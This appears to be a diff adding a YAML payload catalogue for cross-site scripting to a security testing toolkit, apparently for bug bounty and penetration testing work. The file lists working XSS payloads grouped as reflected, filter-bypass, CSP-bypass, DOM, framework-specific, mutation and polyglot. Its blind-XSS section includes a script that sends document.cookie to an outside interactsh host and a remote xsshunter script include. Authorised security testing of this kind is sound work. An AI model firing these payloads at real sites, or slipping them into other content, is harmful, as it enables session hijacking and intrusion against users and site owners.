@@ -1,0 +1,316 @@
+id: xss
+name: Cross-Site Scripting
+version: 1.0.0
+category: injection
+description: |
+  Payloads for reflected, stored, DOM-based, blind, mutation, polyglot and
+  CSP-bypass XSS. Group by subcategory to feed the right payload set into the
+  right tool — dalfox / xsstrike consume reflected; nuclei + custom templates
+  consume blind; framework-specific payloads target React/Angular/Vue sinks.
+mitre:
+  - T1190     # exploit public-facing application
+  - T1059.007 # JavaScript execution
+  - T1185     # browser session hijacking
+owasp_top10:
+  - A03:2021  # injection
+  - A07:2021  # identification and authentication failures (via session theft)
+references:
+  - https://owasp.org/www-community/attacks/xss/
+  - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+  - https://html5sec.org/
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+related_tools:
+  - dalfox
+  - xsstrike
+  - kxss
+  - nuclei
+  - jaeles
+  - xnlinkfinder
+chains:
+  - bug_bounty_full_v2
+  - web_deep
+  - js_deep_dive
+
+payloads:
+
+  # ---- Reflected: classic ----
+  - id: xss_basic_alert
+    name: Basic alert popup
+    subcategory: reflected
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<script>alert(1)</script>"
+    notes: Sanity check — only fires when no filtering is in place.
+    source: common knowledge
+
+  - id: xss_img_onerror
+    name: img tag with onerror
+    subcategory: reflected
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<img src=x onerror=alert(1)>"
+    notes: Bypasses many script-tag-only filters.
+    source: common knowledge
+
+  - id: xss_svg_onload
+    name: SVG with onload handler
+    subcategory: reflected
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<svg/onload=alert(1)>"
+    notes: No quotes, no spaces around onload — passes many naive filters.
+    source: common knowledge
+
+  - id: xss_iframe_srcdoc
+    name: iframe srcdoc with HTML entities
+    subcategory: reflected
+    encoding: html_entities
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>"
+    notes: Sandboxes the payload inside an iframe — sometimes bypasses CSP for self.
+    source: common knowledge
+
+  - id: xss_details_open_ontoggle
+    name: details open with ontoggle
+    subcategory: reflected
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<details open ontoggle=alert(1)>"
+    source: html5sec
+
+  - id: xss_input_autofocus_onfocus
+    name: input autofocus onfocus
+    subcategory: reflected
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<input autofocus onfocus=alert(1)>"
+    source: common knowledge
+
+  # ---- Filter bypasses ----
+  - id: xss_no_alert_keyword
+    name: Avoids the literal "alert" string via top-level access
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<svg/onload=window['ale'+'rt'](1)>"
+    notes: Bypasses keyword blacklists that strip "alert".
+    source: PortSwigger XSS labs
+
+  - id: xss_no_parens
+    name: Throw-based execution — no parens needed
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<svg><script>throw onerror=alert,1</script></svg>"
+    notes: Useful when ( and ) are filtered.
+    source: PortSwigger
+
+  - id: xss_javascript_uri_url
+    name: "javascript: URI in href"
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<a href=\"javascript:alert(1)\">click</a>"
+    source: common knowledge
+
+  - id: xss_data_uri_base64
+    name: "data: URI with base64 script"
+    subcategory: filter_bypass
+    encoding: base64
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>"
+    notes: Decoded payload is <script>alert(1)</script>.
+    source: common knowledge
+
+  - id: xss_unicode_normalisation
+    name: Unicode-normalised script tag
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [unicode_normalisation]
+    severity_when_works: high
+    payload: "<‮script>alert(1)</script>"
+    notes: Some sanitisers strip BiDi marks after token comparison.
+    source: common knowledge
+
+  - id: xss_capital_tags
+    name: Capitalised tag-name bypass
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<ScRiPt>alert(1)</ScRiPt>"
+    source: common knowledge
+
+  # ---- CSP bypasses ----
+  - id: xss_csp_jsonp_callback
+    name: JSONP callback abuse
+    subcategory: csp_bypass
+    encoding: raw
+    tech_targets: [csp_unsafe_jsonp]
+    severity_when_works: critical
+    payload: "<script src=\"https://www.google.com/complete/search?client=chrome&q=&jsonp=alert(1)\"></script>"
+    notes: Works when CSP whitelists google.com / other CDNs with JSONP endpoints.
+    source: PortSwigger / cure53
+
+  - id: xss_csp_angularjs_legacy
+    name: AngularJS expression on whitelisted angular CDN
+    subcategory: csp_bypass
+    encoding: raw
+    tech_targets: [angularjs]
+    severity_when_works: critical
+    payload: "<div ng-app ng-csp><textarea autofocus ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>"
+    notes: Bypasses CSP via legacy AngularJS sandbox escape on whitelisted ajax.googleapis.com.
+    source: cure53 H5SC
+
+  - id: xss_csp_strict_dynamic_dom_clobbering
+    name: DOM-clobbering bypass for strict-dynamic
+    subcategory: csp_bypass
+    encoding: raw
+    tech_targets: [strict_dynamic_csp]
+    severity_when_works: critical
+    payload: "<form id=\"defaultView\"><output name=\"defaultView\" id=\"defaultView\">alert(1)</output></form>"
+    notes: Clobber-named property used by sanitiser; needs a sink that later reads window.defaultView.
+    source: Terjanq / Masato Kinugawa
+
+  # ---- DOM XSS ----
+  - id: xss_dom_location_hash
+    name: location.hash sink
+    subcategory: dom
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "#<img src=x onerror=alert(1)>"
+    notes: Append to URL when the page sinks location.hash into innerHTML.
+    source: PortSwigger DOM XSS labs
+
+  - id: xss_dom_postmessage
+    name: postMessage origin-skip
+    subcategory: dom
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "window.postMessage({type:'auth', token:'<script>alert(1)</script>'}, '*')"
+    notes: Useful when message handler trusts message.data without checking origin.
+    source: PortSwigger
+
+  # ---- Blind XSS ----
+  - id: xss_blind_xsshunter
+    name: XSS Hunter probe
+    subcategory: blind
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "\"><script src=https://x.xsshunter.com></script>"
+    notes: Replace x with your subdomain. Triggers a callback when the payload renders in an admin tool.
+    source: https://xsshunter.com
+
+  - id: xss_blind_image_beacon
+    name: Image-loading beacon
+    subcategory: blind
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<img src=\"https://YOUR-CANARY/{{token}}.gif\">"
+    notes: Replace YOUR-CANARY with a Burp Collaborator or interactsh URL.
+    source: common knowledge
+
+  - id: xss_blind_interactsh
+    name: interactsh callback
+    subcategory: blind
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<script>fetch('https://{{interactsh}}.oast.online/?c='+document.cookie)</script>"
+    source: PD interactsh
+
+  # ---- Framework-specific ----
+  - id: xss_angular_template_injection
+    name: Angular template injection
+    subcategory: framework
+    encoding: raw
+    tech_targets: [angular]
+    severity_when_works: critical
+    payload: "{{constructor.constructor('alert(1)')()}}"
+    notes: Older Angular sandbox escape — payload runs when injected into ng-bind template.
+    source: PortSwigger Angular sandbox bypass
+
+  - id: xss_react_dangerouslySetInnerHTML
+    name: React dangerouslySetInnerHTML
+    subcategory: framework
+    encoding: raw
+    tech_targets: [react]
+    severity_when_works: high
+    payload: "<img src=x onerror=alert(1)>"
+    notes: Works when a React component renders attacker HTML through dangerouslySetInnerHTML.
+    source: React docs / common knowledge
+
+  - id: xss_vue_template
+    name: Vue v-html sink
+    subcategory: framework
+    encoding: raw
+    tech_targets: [vue]
+    severity_when_works: high
+    payload: "<img src=x onerror=alert(1)>"
+    notes: Vue's v-html directive sinks raw HTML — same shape as React dangerouslySetInnerHTML.
+    source: Vue docs
+
+  - id: xss_jquery_html_injection
+    name: jQuery .html() sink
+    subcategory: framework
+    encoding: raw
+    tech_targets: [jquery]
+    severity_when_works: high
+    payload: "<img src=x onerror=alert(1)>"
+    notes: $(selector).html(userInput) parses and executes scripts in some jQuery versions.
+    source: jQuery docs
+
+  # ---- Mutation XSS ----
+  - id: xss_mutation_via_listing
+    name: "Mutation: listing -> script"
+    subcategory: mutation
+    encoding: raw
+    tech_targets: [dompurify_legacy]
+    severity_when_works: high
+    payload: "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>"
+    notes: DOMPurify <= 2.0.17 mutated listing children into executable HTML.
+    source: cure53 DOMPurify advisory
+
+  - id: xss_mutation_noscript
+    name: "Mutation: noscript-trick"
+    subcategory: mutation
+    encoding: raw
+    tech_targets: [dompurify_legacy]
+    severity_when_works: high
+    payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+    source: PortSwigger mXSS
+
+  # ---- Polyglot ----
+  - id: xss_polyglot_0xsobky
+    name: 0xsobky XSS polyglot
+    subcategory: polyglot
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+    notes: Survives multiple contexts (attribute / script / URL / style) — single payload to spray during fuzzing.
+    source: https://github.com/0xsobky/HackVault/wiki
+
+  - id: xss_polyglot_brutelogic
+    name: Brutelogic polyglot
+    subcategory: polyglot
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "'\"><img src=x onerror=alert(1)>"
+    notes: Short polyglot that pops in most reflected contexts.
+    source: brutelogic
